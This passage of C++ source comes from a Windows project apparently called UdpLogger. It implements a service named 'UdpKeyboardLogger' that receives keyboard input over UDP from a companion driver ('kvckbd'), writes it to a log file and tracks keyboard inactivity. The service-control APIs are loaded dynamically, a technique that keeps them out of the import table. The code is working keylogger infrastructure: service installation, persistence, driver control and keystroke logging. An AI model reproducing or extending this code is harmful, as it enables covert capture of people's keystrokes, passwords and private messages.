    if (!hSCM) return false;
    
    SC_HANDLE hService = g_pOpenServiceW(hSCM, ServiceConstants::SERVICE_NAME, SERVICE_STOP);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS status;
    BOOL success = g_pControlService(hService, SERVICE_CONTROL_STOP, &status);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return success || GetLastError() == ERROR_SERVICE_NOT_ACTIVE;
}

bool UdpServiceManager::IsServiceInstalled() noexcept {
    if (!InitDynamicAPIs()) return false;
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    
    SC_HANDLE hService = g_pOpenServiceW(hSCM, ServiceConstants::SERVICE_NAME, SERVICE_QUERY_STATUS);
    bool installed = (hService != nullptr);
    
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return installed;
}

bool UdpServiceManager::IsServiceRunning() noexcept {
    if (!InitDynamicAPIs()) return false;
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    
    SC_HANDLE hService = g_pOpenServiceW(hSCM, ServiceConstants::SERVICE_NAME, SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS status;
    BOOL success = g_pQueryServiceStatus(hService, &status);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return success && (status.dwCurrentState == SERVICE_RUNNING);
}

int UdpServiceManager::RunAsService() noexcept {
    // Service table for dispatcher
    SERVICE_TABLE_ENTRYW serviceTable[] = {
        { const_cast<wchar_t*>(ServiceConstants::SERVICE_NAME), ServiceMain },
        { nullptr, nullptr }
    };
    
    // Start service control dispatcher
    if (!StartServiceCtrlDispatcherW(serviceTable)) {
        // If we're not running as service, this will fail
        return 1;
    }
    
    return 0;
}

VOID WINAPI UdpServiceManager::ServiceMain(DWORD argc, LPWSTR* argv) {
    // Register service control handler
    s_serviceStatusHandle = RegisterServiceCtrlHandlerW(ServiceConstants::SERVICE_NAME, ServiceCtrlHandler);
    if (!s_serviceStatusHandle) {
        return;
    }
    
    // Initialize service status
    s_serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    s_serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    s_serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    s_serviceStatus.dwWin32ExitCode = NO_ERROR;
    s_serviceStatus.dwServiceSpecificExitCode = 0;
    s_serviceStatus.dwCheckPoint = 0;
    s_serviceStatus.dwWaitHint = 5000;
    
    SetServiceStatus(SERVICE_START_PENDING, NO_ERROR, 5000);
    
    // Create stop event
    s_serviceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
    if (!s_serviceStopEvent) {
        SetServiceStatus(SERVICE_STOPPED, GetLastError());
        return;
    }
    
    // Set running flag before initializing components
    s_serviceRunning = true;
    
    // Initialize service components
    if (!InitializeServiceComponents()) {
        SetServiceStatus(SERVICE_STOPPED, ERROR_SERVICE_SPECIFIC_ERROR);
        ServiceCleanup();
        return;
    }
    
    // Create worker thread
    HANDLE hWorkerThread = CreateThread(nullptr, 0, ServiceWorkerThread, nullptr, 0, nullptr);
    if (!hWorkerThread) {
        SetServiceStatus(SERVICE_STOPPED, GetLastError());
        ServiceCleanup();
        return;
    }
    
    // Service is now running
    SetServiceStatus(SERVICE_RUNNING);
    
    // Wait for stop signal
    WaitForSingleObject(hWorkerThread, INFINITE);
    CloseHandle(hWorkerThread);
    
    // Cleanup and exit
    ServiceCleanup();
    SetServiceStatus(SERVICE_STOPPED);
}

VOID WINAPI UdpServiceManager::ServiceCtrlHandler(DWORD ctrlCode) {
    switch (ctrlCode) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            SetServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 5000);
            s_serviceRunning = false;
            if (s_serviceStopEvent) {
                SetEvent(s_serviceStopEvent);
            }
            break;
            
        case SERVICE_CONTROL_INTERROGATE:
            SetServiceStatus(s_serviceStatus.dwCurrentState);
            break;
            
        default:
            break;
    }
}

DWORD WINAPI UdpServiceManager::ServiceWorkerThread(LPVOID param) {
    // Initialize last activity time
    g_lastActivity = std::chrono::steady_clock::now();
    auto lastFlush = std::chrono::steady_clock::now();
    
    // Main service loop
    while (s_serviceRunning) {
        // Check for inactivity
        auto now = std::chrono::steady_clock::now();
        auto inactiveTime = std::chrono::duration_cast<std::chrono::minutes>(now - g_lastActivity);
        
        if (inactiveTime >= Config::INACTIVITY_THRESHOLD) {
            auto secondsInactive = std::chrono::duration_cast<std::chrono::seconds>(inactiveTime);
            
            static std::chrono::steady_clock::time_point lastInactivityLog;
            if (now - lastInactivityLog >= std::chrono::minutes(5)) {
                if (g_serviceLogger) {
                    std::string inactivityMsg = "*** INACTIVITY: No keyboard input for " + 
                                               std::to_string(secondsInactive.count() / 60) + " minutes ***";
                    g_serviceLogger->log(inactivityMsg);
                }
                lastInactivityLog = now;
            }
        }
        
        // Periodic flush every 15 minutes
        auto timeSinceFlush = std::chrono::duration_cast<std::chrono::minutes>(now - lastFlush);
        if (timeSinceFlush >= std::chrono::minutes(15)) {
            if (g_serviceLogger) {
                auto systemNow = std::chrono::system_clock::now();
                auto currentTime = std::chrono::system_clock::to_time_t(systemNow);
                std::ofstream flushLog("C:\\Temp\\udp_flush_debug.log", std::ios::app);
                flushLog << "Periodic flush at: " << currentTime << std::endl;
            }
            lastFlush = now;
        }
        
        // Wait for stop event with timeout
        DWORD waitResult = WaitForSingleObject(s_serviceStopEvent, 1000);
        
        if (waitResult == WAIT_OBJECT_0) {
            break;
        }
    }
    
    return 0;
}

bool UdpServiceManager::SetServiceStatus(DWORD currentState, DWORD exitCode, DWORD waitHint) noexcept {
    static DWORD checkPoint = 1;
    
    s_serviceStatus.dwCurrentState = currentState;
    s_serviceStatus.dwWin32ExitCode = exitCode;
    s_serviceStatus.dwWaitHint = waitHint;
    
    if (currentState == SERVICE_START_PENDING || currentState == SERVICE_STOP_PENDING) {
        s_serviceStatus.dwCheckPoint = checkPoint++;
    } else {
        s_serviceStatus.dwCheckPoint = 0;
    }
    
    return ::SetServiceStatus(s_serviceStatusHandle, &s_serviceStatus) != FALSE;
}

bool UdpServiceManager::InitializeServiceComponents() noexcept {
    try {
        // Get log file path from PathHelper
        std::filesystem::path logPath = PathHelper::GetLogFilePath(Config::LOG_FILENAME);
        //debug-wesmar: std::filesystem::path logPath = L"C:\\Temp\\UdpLogger.txt";
		
        // Initialize logger
        g_serviceLogger = std::make_unique<FileLogger>(logPath.string());
        
        // Initialize UDP listener
        g_udpListener = std::make_unique<UdpListener>(Config::BIND_ADDRESS, Config::UDP_PORT);
        
        // Set message handler
        g_udpListener->setMessageHandler([](const std::string& message, const std::string& client) {
            g_lastActivity = std::chrono::steady_clock::now();
            
            // Write header on first message
            if (!g_headerWritten) {
                g_firstClientAddress = client;
                g_serviceLogger->writeHeader(Config::BIND_ADDRESS, Config::UDP_PORT, client);
                g_headerWritten = true;
            }
            
            // Log message (without client address - it's in header)
            g_serviceLogger->log(message);
        });
        
        // Start UDP listener
        if (!g_udpListener->start()) {
            return false;
        }
        
        return true;
        
    } catch (const std::exception&) {
        return false;
    } catch (...) {
        return false;
    }
}

void UdpServiceManager::ServiceCleanup() noexcept {
    // Stop UDP listener
    if (g_udpListener) {
        g_udpListener->stop();
        g_udpListener.reset();
    }
    
    // Write footer and close logger
    if (g_serviceLogger) {
        g_serviceLogger->writeFooter();
        g_serviceLogger.reset();
    }
    
    // Close stop event
    if (s_serviceStopEvent) {
        CloseHandle(s_serviceStopEvent);
        s_serviceStopEvent = nullptr;
    }
}

bool UdpServiceManager::StartDriverService() noexcept {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"kvckbd", SERVICE_START);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    BOOL success = StartServiceW(hService, 0, nullptr);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return success || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
}

bool UdpServiceManager::StopDriverService() noexcept {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"kvckbd", SERVICE_STOP);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS status;
    BOOL success = ControlService(hService, SERVICE_CONTROL_STOP, &status);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return success || GetLastError() == ERROR_SERVICE_NOT_ACTIVE;
}

bool UdpServiceManager::RestartDriverService() noexcept {
    StopDriverService();
    Sleep(2000); // Wait for service to stop
    return StartDriverService();
}

bool UdpServiceManager::IsDriverServiceRunning() noexcept {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"kvckbd", SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS status;
    BOOL success = QueryServiceStatus(hService, &status);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return success && (status.dwCurrentState == SERVICE_RUNNING);
}


================================================================================
 FILE: UdpLogger\UdpServiceManager.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 09:59:50
 File size     : 2.24 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <Windows.h>
#include <string>

namespace ServiceConstants {
    constexpr const wchar_t* SERVICE_NAME = L"UdpKeyboardLogger";
    constexpr const wchar_t* SERVICE_DISPLAY_NAME = L"UDP Keyboard Logger Service";
    constexpr const wchar_t* SERVICE_DESCRIPTION = L"Logs keyboard input received via UDP protocol to file with daily rotation";
}

class UdpServiceManager {
public:
    // Service installation/management
    static bool InstallService(const std::wstring& exePath) noexcept;
    static bool UninstallService() noexcept;
    static bool StartServiceProcess() noexcept;
    static bool StopServiceProcess() noexcept;
    static int RunAsService() noexcept;
    
    // Service status queries
    static bool IsServiceInstalled() noexcept;
    static bool IsServiceRunning() noexcept;

    // ADD THESE NEW METHODS FOR DRIVER MANAGEMENT:
    static bool StartDriverService() noexcept;
    static bool StopDriverService() noexcept;
    static bool RestartDriverService() noexcept;
    static bool IsDriverServiceRunning() noexcept;

private:
    // Service entry points
    static VOID WINAPI ServiceMain(DWORD argc, LPWSTR* argv);
    static VOID WINAPI ServiceCtrlHandler(DWORD ctrlCode);
    static DWORD WINAPI ServiceWorkerThread(LPVOID param);
    
    // Service helpers
    static bool SetServiceStatus(DWORD currentState, DWORD exitCode = NO_ERROR, DWORD waitHint = 0) noexcept;
    static bool InitializeServiceComponents() noexcept;
    static void ServiceCleanup() noexcept;
    static bool InitDynamicAPIs() noexcept;
    
    // Service state
    static SERVICE_STATUS_HANDLE s_serviceStatusHandle;
    static SERVICE_STATUS s_serviceStatus;
    static HANDLE s_serviceStopEvent;
    static volatile bool s_serviceRunning;
    
    // Dynamic API pointers
    static decltype(&::OpenServiceW) g_pOpenServiceW;
    static decltype(&::CreateServiceW) g_pCreateServiceW;
    static decltype(&::DeleteService) g_pDeleteService;
    static decltype(&::StartServiceW) g_pStartServiceW;
    static decltype(&::ControlService) g_pControlService;
    static decltype(&::QueryServiceStatus) g_pQueryServiceStatus;
};


